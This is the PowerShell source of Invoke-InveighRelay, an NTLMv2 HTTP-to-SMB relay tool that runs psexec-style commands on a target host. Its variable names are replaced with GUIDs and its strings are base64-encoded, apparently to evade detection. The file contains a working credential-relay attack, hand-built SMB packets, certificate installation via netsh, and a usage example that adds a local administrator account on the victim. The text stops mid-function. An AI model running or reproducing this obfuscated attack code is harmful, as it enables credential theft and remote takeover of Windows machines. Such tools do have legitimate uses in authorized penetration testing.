Function Invoke-InveighRelay
{
<#
.SYNOPSIS
Invoke-InveighRelay performs NTLMv2 HTTP to SMB relay with psexec style command execution.

.DESCRIPTION
Invoke-InveighRelay currently supports NTLMv2 HTTP to SMB relay with psexec style command execution.

    HTTP/HTTPS to SMB NTLMv2 relay with granular control
    NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS
    Granular control of console and file output
    Can be executed as either a standalone function or through Invoke-Inveigh

.PARAMETER HTTP
Default = Enabled: (Y/N) Enable/Disable HTTP challenge/response capture.

.PARAMETER HTTPS
Default = Disabled: (Y/N) Enable/Disable HTTPS challenge/response capture. Warning, a cert will be installed in
the local store and attached to port 443. If the script does not exit gracefully, execute
"netsh http delete sslcert ipport=0.0.0.0:443" and manually remove the certificate from "Local Computer\Personal"
in the cert store.

.PARAMETER HTTPSCertAppID
Specify a valid application GUID for use with the ceriticate.

.PARAMETER HTTPSCertThumbprint
Specify a certificate thumbprint for use with a custom certificate. The certificate filename must be located in
the current working directory and named Inveigh.pfx.

.PARAMETER Challenge
Default = Random: Specify a 16 character hex NTLM challenge for use with the HTTP listener. If left blank, a
random challenge will be generated for each request. Note that during SMB relay attempts, the challenge will be
pulled from the SMB relay target. 

.PARAMETER MachineAccounts
Default = Disabled: (Y/N) Enable/Disable showing NTLM challenge/response captures from machine accounts.

.PARAMETER WPADAuth
Default = NTLM: (Anonymous,NTLM) Specify the HTTP/HTTPS server authentication type for wpad.dat requests. Setting
to Anonymous can prevent browser login prompts.

.PARAMETER SMBRelayTarget
IP address of system to target for SMB relay.

.PARAMETER SMBRelayCommand
Command to execute on SMB relay target. Use PowerShell character escapes where necessary.

.PARAMETER SMBRelayUsernames
Default = All Usernames: Comma separated list of usernames to use for relay attacks. Accepts both username and
domain\username format. 

.PARAMETER SMBRelayAutoDisable
Default = Enable: (Y/N) Automaticaly disable SMB relay after a successful command execution on target.

.PARAMETER SMBRelayNetworkTimeout
Default = No Timeout: (Integer) Set the duration in seconds that Inveigh will wait for a reply from the SMB relay
target after each packet is sent.

.PARAMETER ConsoleOutput
Default = Disabled: (Y/N) Enable/Disable real time console output. If using this option through a shell, test to
ensure that it doesn't hang the shell.

.PARAMETER FileOutput
Default = Disabled: (Y/N) Enable/Disable real time file output.

.PARAMETER StatusOutput
Default = Enabled: (Y/N) Enable/Disable startup and shutdown messages.

.PARAMETER OutputStreamOnly
Default = Disabled: Enable/Disable forcing all output to the standard output stream. This can be helpful if
running Inveigh Relay through a shell that does not return other output streams. Note that you will not see the
various yellow warning messages if enabled.

.PARAMETER OutputDir
Default = Working Directory: Set a valid path to an output directory for log and capture files. FileOutput must
also be enabled.

.PARAMETER RunTime
(Integer) Set the run time duration in minutes.

.PARAMETER ShowHelp
Default = Enabled: (Y/N) Enable/Disable the help messages at startup.

.PARAMETER Tool
Default = 0: (0,1,2) Enable/Disable features for better operation through external tools such as Metasploit's
Interactive Powershell Sessions and Empire. 0 = None, 1 = Metasploit, 2 = Empire  

.EXAMPLE
Invoke-InveighRelay -SMBRelayTarget 192.168.2.55 -SMBRelayCommand "net user Dave Spring2016 /add && net localgroup administrators Dave /add"
Execute with SMB relay enabled with a command that will create a local administrator account on the SMB relay
target.

.LINK
https://github.com/Kevin-Robertson/Inveigh
#>
param
( 
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c020fd7010d54ca7a39f33b641e8d7e7}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${dd19d094d4e64575b067542c12113191}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${ccb72a9cde3642378fe4614a602bf814}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${dcb44cbc6403431a876fa4a2031d130d}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${d86ac4df696843c5b49e41acf79d7fef}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${a1002d0a44734d58a514177e917126b7}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${bb9de80bf8c74ca39ebee231186cdfb9}="N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c3fa3421e45845e081267bcf4270353a}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][string]${c38d4b076a0145059ce8d4f43f98df67}="Y",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","NTLM")][string]${a381358e226d49d5846c08b31f90af24}="NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][string]${a4bc6b9088754e9084e97804dd858aa6}="0",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][string]${b85342af28cd4624aa4bee036bc4d540}="",
    [parameter(Mandatory=$true)][ValidateScript({$_ -match [IPAddress]$_ })][string]${b4c7b8b4490e41f88e9083ddb989ee62} ="",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][string]${a59c99006ba3478e9af3c645db0a1311}="",
    [parameter(Mandatory=$false)][array]${d194a1cff36f443691fe7b6dae84db94}="",
    [parameter(Mandatory=$false)][int]${ce8aca9715a04e2c9f2a44b1b8fdfadd}="",
    [parameter(Mandatory=$false)][int]${e1da88ca03e24046b73a694ac4b88237}="",
    [parameter(Mandatory=$true)][string]${a9b4a2ed80da4358b66ed01c153ac674} = "", 
    [parameter(Mandatory=$false)][string]${d36c14fd634246938912de63cd8e65ed}="00112233-4455-6677-8899-AABBCCDDEEFF",
    [parameter(Mandatory=$false)][string]${c4335e9175fe4be9b3d55ff73c22e62c}="98c1d54840c5c12ced710758b6ee56cc62fa1f0d",
    [parameter(ValueFromRemainingArguments=$true)]${b2658962f7c24b559994c6ba448a9937}
)
if (${b2658962f7c24b559994c6ba448a9937})
{
    throw "$(${b2658962f7c24b559994c6ba448a9937}) is not a valid parameter."
}
if(!${b4c7b8b4490e41f88e9083ddb989ee62})
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AUwBNAEIAUgBlAGwAYQB5AFQAYQByAGcAZQB0ACAAaQBmACAAZQBuAGEAYgBsAGkAbgBnACAALQBTAE0AQgBSAGUAbABhAHkA')))
}
if(!${a9b4a2ed80da4358b66ed01c153ac674})
{
    Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBwAGUAYwBpAGYAeQAgAGEAbgAgAC0AUwBNAEIAUgBlAGwAYQB5AEMAbwBtAG0AYQBuAGQAIABpAGYAIABlAG4AYQBiAGwAaQBuAGcAIAAtAFMATQBCAFIAZQBsAGEAeQA=')))
}
if(!${b85342af28cd4624aa4bee036bc4d540})
{ 
    ${436d4fc7cf3d441a9eaeea3c205d07cc} = $PWD.Path
}
else
{
    ${436d4fc7cf3d441a9eaeea3c205d07cc} = ${b85342af28cd4624aa4bee036bc4d540}
}
if(!${14770f41645f456d8f09e703674e2364})
{
    ${global:14770f41645f456d8f09e703674e2364} = [hashtable]::Synchronized(@{})
    ${14770f41645f456d8f09e703674e2364}.log = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.NTLMv1_list = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.NTLMv2_list = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.IP_capture_list = @()
    ${14770f41645f456d8f09e703674e2364}.SMBRelay_failed_list = @()
}
if(${14770f41645f456d8f09e703674e2364}.HTTP_listener.IsListening)
{
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Stop()
    ${14770f41645f456d8f09e703674e2364}.HTTP_listener.Close()
}
if(!${14770f41645f456d8f09e703674e2364}.running)
{
    ${14770f41645f456d8f09e703674e2364}.console_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.status_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.log_file_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.NTLMv1_file_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.NTLMv2_file_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.certificate_application_ID = ${d36c14fd634246938912de63cd8e65ed}
    ${14770f41645f456d8f09e703674e2364}.certificate_thumbprint = ${c4335e9175fe4be9b3d55ff73c22e62c}
    ${14770f41645f456d8f09e703674e2364}.HTTP_challenge_queue = New-Object System.Collections.ArrayList
    ${14770f41645f456d8f09e703674e2364}.console_output = $false
    ${14770f41645f456d8f09e703674e2364}.console_input = $true
    ${14770f41645f456d8f09e703674e2364}.file_output = $false
    ${14770f41645f456d8f09e703674e2364}.log_out_file = ${436d4fc7cf3d441a9eaeea3c205d07cc} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATABvAGcALgB0AHgAdAA=')))
    ${14770f41645f456d8f09e703674e2364}.NTLMv1_out_file = ${436d4fc7cf3d441a9eaeea3c205d07cc} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADEALgB0AHgAdAA=')))
    ${14770f41645f456d8f09e703674e2364}.NTLMv2_out_file = ${436d4fc7cf3d441a9eaeea3c205d07cc} + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC0ATgBUAEwATQB2ADIALgB0AHgAdAA=')))
    ${14770f41645f456d8f09e703674e2364}.challenge = ${a59c99006ba3478e9af3c645db0a1311}
}
${14770f41645f456d8f09e703674e2364}.relay_running = $true
${14770f41645f456d8f09e703674e2364}.SMB_relay_active_step = 0
${14770f41645f456d8f09e703674e2364}.SMB_relay = $true
if(${d86ac4df696843c5b49e41acf79d7fef} -eq 'y')
{
    ${14770f41645f456d8f09e703674e2364}.status_output = $true
}
else
{
    ${14770f41645f456d8f09e703674e2364}.status_output = $false
}
if(${a1002d0a44734d58a514177e917126b7} -eq 'y')
{
    ${14770f41645f456d8f09e703674e2364}.output_stream_only = $true
}
else
{
    ${14770f41645f456d8f09e703674e2364}.output_stream_only = $false
}
if(${a4bc6b9088754e9084e97804dd858aa6} -eq 1) 
{
    ${14770f41645f456d8f09e703674e2364}.tool = 1
    ${14770f41645f456d8f09e703674e2364}.output_stream_only = $true
    ${14770f41645f456d8f09e703674e2364}.newline = ""
    ${ccb72a9cde3642378fe4614a602bf814} = "N"
}
elseif(${a4bc6b9088754e9084e97804dd858aa6} -eq 2) 
{
    ${14770f41645f456d8f09e703674e2364}.tool = 2
    ${14770f41645f456d8f09e703674e2364}.output_stream_only = $true
    ${14770f41645f456d8f09e703674e2364}.console_input = $false
    ${14770f41645f456d8f09e703674e2364}.newline = "`n"
    ${ccb72a9cde3642378fe4614a602bf814} = "Y"
    ${c3fa3421e45845e081267bcf4270353a} = "N"
}
else
{
    ${14770f41645f456d8f09e703674e2364}.tool = 0
    ${14770f41645f456d8f09e703674e2364}.newline = ""
}
if(!${14770f41645f456d8f09e703674e2364}.running)
{
    ${14770f41645f456d8f09e703674e2364}.status_queue.add("Inveigh Relay started at $(Get-Date -format 's')")|Out-Null
    ${14770f41645f456d8f09e703674e2364}.log.add(${14770f41645f456d8f09e703674e2364}.log_file_queue[${14770f41645f456d8f09e703674e2364}.log_file_queue.add("$(Get-Date -format 's') - Inveigh Relay started")]) |Out-Null
    if(${c020fd7010d54ca7a39f33b641e8d7e7} -eq 'y')
    {
        ${14770f41645f456d8f09e703674e2364}.HTTP = $true
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.HTTP = $false
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUAAgAEMAYQBwAHQAdQByAGUAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
    }
    if(${dd19d094d4e64575b067542c12113191} -eq 'y')
    {
        try
        {
            ${14770f41645f456d8f09e703674e2364}.HTTPS = $true
            ${7e5d050b3aea4cd0887741807a5571b0} = New-Object System.Security.Cryptography.X509Certificates.X509Store("My",$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAE0AYQBjAGgAaQBuAGUA'))))
            ${7e5d050b3aea4cd0887741807a5571b0}.Open($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAZABXAHIAaQB0AGUA'))))
            ${bf44b319df8e49b3bbfa07b718a1f591} = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            ${bf44b319df8e49b3bbfa07b718a1f591}.Import($PWD.Path + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XABJAG4AdgBlAGkAZwBoAC4AcABmAHgA'))))
            ${7e5d050b3aea4cd0887741807a5571b0}.Add(${bf44b319df8e49b3bbfa07b718a1f591}) 
            ${7e5d050b3aea4cd0887741807a5571b0}.Close()
            ${ea73aff405bc40ab870fb43e6aa8ee34} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBlAHIAdABoAGEAcwBoAD0A'))) + ${14770f41645f456d8f09e703674e2364}.certificate_thumbprint
            ${5bc27154d4534d298f745948a74db9e3} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBwAHAAaQBkAD0AewA='))) + ${14770f41645f456d8f09e703674e2364}.certificate_application_ID + "}"
            ${f899d098d90b4f6fbdac82dac792b677} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aAB0AHQAcAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBzAGwAYwBlAHIAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBwAHAAbwByAHQAPQAwAC4AMAAuADAALgAwADoANAA0ADMA'))),${ea73aff405bc40ab870fb43e6aa8ee34},${5bc27154d4534d298f745948a74db9e3})
            & $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBlAHQAcwBoAA=='))) ${f899d098d90b4f6fbdac82dac792b677} > $null
            ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEUAbgBhAGIAbABlAGQA'))))|Out-Null
        }
        catch
        {
            ${7e5d050b3aea4cd0887741807a5571b0}.Close()
            ${dd19d094d4e64575b067542c12113191}="N"
            ${14770f41645f456d8f09e703674e2364}.HTTPS = $false
            ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEQAaQBzAGEAYgBsAGUAZAAgAEQAdQBlACAAVABvACAAQwBlAHIAdABpAGYAaQBjAGEAdABlACAASQBuAHMAdABhAGwAbAAgAEUAcgByAG8AcgA='))))|Out-Null
        }
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SABUAFQAUABTACAAQwBhAHAAdAB1AHIAZQAgAEQAaQBzAGEAYgBsAGUAZAA='))))|Out-Null
    }
    if(${a59c99006ba3478e9af3c645db0a1311})
    {
        ${14770f41645f456d8f09e703674e2364}.challenge = ${a59c99006ba3478e9af3c645db0a1311}
        ${14770f41645f456d8f09e703674e2364}.status_queue.add("NTLM Challenge = ${a59c99006ba3478e9af3c645db0a1311}")|Out-Null
    }
    if(${bb9de80bf8c74ca39ebee231186cdfb9} -eq 'n')
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBnAG4AbwByAGkAbgBnACAATQBhAGMAaABpAG4AZQAgAEEAYwBjAG8AdQBuAHQAcwA='))))|Out-Null
    }
    ${14770f41645f456d8f09e703674e2364}.status_queue.add("Force WPAD Authentication = ${a381358e226d49d5846c08b31f90af24}")|Out-Null
    if(${ccb72a9cde3642378fe4614a602bf814} -eq 'y')
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
        ${14770f41645f456d8f09e703674e2364}.console_output = $true
    }
    else
    {
        if(${14770f41645f456d8f09e703674e2364}.tool -eq 1)
        {
            ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQAIABEAHUAZQAgAFQAbwAgAEUAeAB0AGUAcgBuAGEAbAAgAFQAbwBvAGwAIABTAGUAbABlAGMAdABpAG8AbgA='))))|Out-Null
        }
        else
        {
            ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABDAG8AbgBzAG8AbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
        }
    }
    if(${dcb44cbc6403431a876fa4a2031d130d} -eq 'y')
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABFAG4AYQBiAGwAZQBkAA=='))))|Out-Null
        ${14770f41645f456d8f09e703674e2364}.status_queue.add("Output Directory = ${436d4fc7cf3d441a9eaeea3c205d07cc}")|Out-Null
        ${14770f41645f456d8f09e703674e2364}.file_output = $true
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGEAbAAgAFQAaQBtAGUAIABGAGkAbABlACAATwB1AHQAcAB1AHQAIABEAGkAcwBhAGIAbABlAGQA'))))|Out-Null
    }
    if(${e1da88ca03e24046b73a694ac4b88237} -eq 1)
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add("Run Time = ${e1da88ca03e24046b73a694ac4b88237} Minute")|Out-Null
    }
    elseif(${e1da88ca03e24046b73a694ac4b88237} -gt 1)
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add("Run Time = ${e1da88ca03e24046b73a694ac4b88237} Minutes")|Out-Null
    }
}
${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABSAGUAbABhAHkAIABFAG4AYQBiAGwAZQBkAA==')))) |Out-Null
${14770f41645f456d8f09e703674e2364}.status_queue.add("SMB Relay Target = ${b4c7b8b4490e41f88e9083ddb989ee62}")|Out-Null
if(${d194a1cff36f443691fe7b6dae84db94})
{
    if(${d194a1cff36f443691fe7b6dae84db94}.Count -eq 1)
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABSAGUAbABhAHkAIABVAHMAZQByAG4AYQBtAGUAIAA9ACAA'))) + ${d194a1cff36f443691fe7b6dae84db94} -join ",")|Out-Null
    }
    else
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABSAGUAbABhAHkAIABVAHMAZQByAG4AYQBtAGUAcwAgAD0AIAA='))) + ${d194a1cff36f443691fe7b6dae84db94} -join ",")|Out-Null
    }
}
if(${c38d4b076a0145059ce8d4f43f98df67} -eq 'y')
{
    ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABSAGUAbABhAHkAIABBAHUAdABvACAARABpAHMAYQBiAGwAZQAgAEUAbgBhAGIAbABlAGQA'))))|Out-Null
}
else
{
    ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBNAEIAIABSAGUAbABhAHkAIABBAHUAdABvACAARABpAHMAYQBiAGwAZQAgAEQAaQBzAGEAYgBsAGUAZAA='))))|Out-Null
}
if(${ce8aca9715a04e2c9f2a44b1b8fdfadd})
{
    ${14770f41645f456d8f09e703674e2364}.status_queue.add("SMB Relay Network Timeout = ${ce8aca9715a04e2c9f2a44b1b8fdfadd} Seconds")|Out-Null
}
if(${c3fa3421e45845e081267bcf4270353a} -eq 'y')
{
    ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAIABHAGUAdAAtAEMAbwBtAG0AYQBuAGQAIAAtAE4AbwB1AG4AIABJAG4AdgBlAGkAZwBoACoAIAB0AG8AIABzAGgAbwB3ACAAYQB2AGEAaQBsAGEAYgBsAGUAIABmAHUAbgBjAHQAaQBvAG4AcwA='))))|Out-Null
    ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIABJAG4AdgBlAGkAZwBoAA=='))))|Out-Null
    if(${14770f41645f456d8f09e703674e2364}.console_output)
    {
        ${14770f41645f456d8f09e703674e2364}.status_queue.add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAGUAcwBzACAAYQBuAHkAIABrAGUAeQAgAHQAbwAgAHMAdABvAHAAIAByAGUAYQBsACAAdABpAG0AZQAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAA='))))|Out-Null
    }
}
if(${14770f41645f456d8f09e703674e2364}.status_output)
{
    while(${14770f41645f456d8f09e703674e2364}.status_queue.Count -gt 0)
    {
        if(${14770f41645f456d8f09e703674e2364}.output_stream_only)
        {
            write-output(${14770f41645f456d8f09e703674e2364}.status_queue[0] + ${14770f41645f456d8f09e703674e2364}.newline)
            ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
        }
        else
        {
            switch (${14770f41645f456d8f09e703674e2364}.status_queue[0])
            {
                $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgB1AG4AIABTAHQAbwBwAC0ASQBuAHYAZQBpAGcAaAAgAHQAbwAgAHMAdABvAHAAIABJAG4AdgBlAGkAZwBoAA==')))
                {
                    write-warning(${14770f41645f456d8f09e703674e2364}.status_queue[0])
                    ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
                }
                default
                {
                    write-output(${14770f41645f456d8f09e703674e2364}.status_queue[0])
                    ${14770f41645f456d8f09e703674e2364}.status_queue.RemoveRange(0,1)
                }
            }
        }
    }
}
${002c9b962501458da0b3893ffda80e26} = [System.Diagnostics.Process]::GetCurrentProcess() |select -expand id
${002c9b962501458da0b3893ffda80e26} = [BitConverter]::ToString([BitConverter]::GetBytes(${002c9b962501458da0b3893ffda80e26}))
${002c9b962501458da0b3893ffda80e26} = ${002c9b962501458da0b3893ffda80e26} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAALQAwADAA'))),""
[Byte[]]${14770f41645f456d8f09e703674e2364}.process_ID_bytes = ${002c9b962501458da0b3893ffda80e26}.Split("-") | %{[CHAR][CONVERT]::toint16($_,16)}
${0d1737d878564f6daeda9a795d5580f5} =
{
    Function DataToUInt16(${e3bb966c775841238a839e41fd4d6ce1})
    {
	   [Array]::Reverse(${e3bb966c775841238a839e41fd4d6ce1})
	   return [BitConverter]::ToUInt16(${e3bb966c775841238a839e41fd4d6ce1},0)
    }
    Function DataToUInt32(${e3bb966c775841238a839e41fd4d6ce1})
    {
	   [Array]::Reverse(${e3bb966c775841238a839e41fd4d6ce1})
	   return [BitConverter]::ToUInt32(${e3bb966c775841238a839e41fd4d6ce1},0)
    }
    Function DataLength
    {
        param ([int]${e0f6df3bf2dc468886b3d39d8390a70e},[byte[]]${e3b693d7dfe347a18db1355c6441d58d})
        ${d51daee9ad73409096efac699b7527aa} = [System.BitConverter]::ToInt16(${e3b693d7dfe347a18db1355c6441d58d}[${e0f6df3bf2dc468886b3d39d8390a70e}..(${e0f6df3bf2dc468886b3d39d8390a70e} + 1)],0)
        return ${d51daee9ad73409096efac699b7527aa}
    }
    Function DataToString
    {
        param ([int]${d51daee9ad73409096efac699b7527aa},[int]${d6af744a66fa4a199d3bb563a67832b3},[int]${ad342d8e6bd34c2984758d17af81ff17},[int]${b16355d04e7f4b66b163c8d48f61e6b7},[byte[]]${e3b693d7dfe347a18db1355c6441d58d})
        ${ccde0cc707174701973bd8de9b17e085} = [System.BitConverter]::ToString(${e3b693d7dfe347a18db1355c6441d58d}[(${b16355d04e7f4b66b163c8d48f61e6b7}+${d6af744a66fa4a199d3bb563a67832b3}+${ad342d8e6bd34c2984758d17af81ff17})..(${b16355d04e7f4b66b163c8d48f61e6b7}+${d51daee9ad73409096efac699b7527aa}+${d6af744a66fa4a199d3bb563a67832b3}+${ad342d8e6bd34c2984758d17af81ff17}-1)])
        ${ccde0cc707174701973bd8de9b17e085} = ${ccde0cc707174701973bd8de9b17e085} -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQAwADAA'))),""
        ${ccde0cc707174701973bd8de9b17e085} = ${ccde0cc707174701973bd8de9b17e085}.Split("-") | %{ [CHAR][CONVERT]::toint16($_,16)}
        ${8e6bbbb523754994a7f45defd793d412} = New-Object System.String (${ccde0cc707174701973bd8de9b17e085},0,${ccde0cc707174701973bd8de9b17e085}.Length)
        return ${8e6bbbb523754994a7f45defd793d412}
    }
}
${16f8c8794ab74ad68dc5c2a920b74294} =
{
    Function SMBNTLMChallenge
    {
        param ([byte[]]${cc9c279d4bde4006aad24f8299300d75})
        ${04e8633877b44d198a703ab3a398c233} = [System.BitConverter]::ToString(${cc9c279d4bde4006aad24f8299300d75})
        ${04e8633877b44d198a703ab3a398c233} = ${04e8633877b44d198a703ab3a398c233} -replace "-",""
        ${e078a3bc2f88451b98e1f931626355c5} = ${04e8633877b44d198a703ab3a398c233}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('NABFADUANAA0AEMANABEADUAMwA1ADMANQAwADAAMAA='))))
        if(${04e8633877b44d198a703ab3a398c233}.SubString((${e078a3bc2f88451b98e1f931626355c5} + 16),8) -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAAyADAAMAAwADAAMAAwAA=='))))
        {
            ${467671d871af40c5a207d5224d4c3cf4} = ${04e8633877b44d198a703ab3a398c233}.SubString((${e078a3bc2f88451b98e1f931626355c5} + 48),16)
        }
        return ${467671d871af40c5a207d5224d4c3cf4}
    }
}
${a80e3f9a637441f690c1b02a33c0865b} =
{
    Function SMBRelayChallenge
    {
        param (${b5a410ab8b3741c7aa10b8c950fa2b93},${a9193eb32e9d4059a8ee112591b4c284})
        if (${b5a410ab8b3741c7aa10b8c950fa2b93})
        {
            ${85245ee5fd1543e7bc94b3ee8b7ee6ca} = ${b5a410ab8b3741c7aa10b8c950fa2b93}.GetStream()
        }
        ${b14be03d0cb9490c9f9b45e438745f33} = New-Object System.Byte[] 1024
        ${a10417d5e3184252837bf6f5a7df4ee3} = 0
        :SMB_relay_challenge_loop while (${a10417d5e3184252837bf6f5a7df4ee3} -lt 2)
        {
            switch (${a10417d5e3184252837bf6f5a7df4ee3})
            {
                0 {
                    [Byte[]] $SMB_relay_challenge_send = (0x00,0x00,0x00,0x2f,0xff,0x53,0x4d,0x42,0x72,0x00,0x00,0x00,0x00,0x18,0x01,0x48)`
                        + (0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff)`
                        + ${14770f41645f456d8f09e703674e2364}.process_ID_bytes`
                        + (0x00,0x00,0x00,0x00,0x00,0x0c,0x00,0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00)
                }
                1 { 
                    ${b78a212c1f7a4231aadd452e02ae358c} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AFgAMgB9AA=='))) -f (${a9193eb32e9d4059a8ee112591b4c284}.length + 32)
                    ${6ef85f0986c4451082b56ed39a4d568c} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AFgAMgB9AA=='))) -f (${a9193eb32e9d4059a8ee112591b4c284}.length + 22)
                    ${2b7dffccef024dbdb39395b9fa2b6cfe} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AFgAMgB9AA=='))) -f (${a9193eb32e9d4059a8ee112591b4c284}.length + 2)
                    ${a0d47ed2fd90469ca67886d5df77d3c5} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('MAB4AHsAMAA6AFgAMgB9AA=='))) -f (${a9193eb32e9d4059a8ee112591b4c284}.length)
                    ${7f26f613b1c741f1a2beceeccb6d3ceb} = [BitConverter]::ToString([BitConverter]::GetBytes(${a9193eb32e9d4059a8ee112591b4c284}.length + 34))
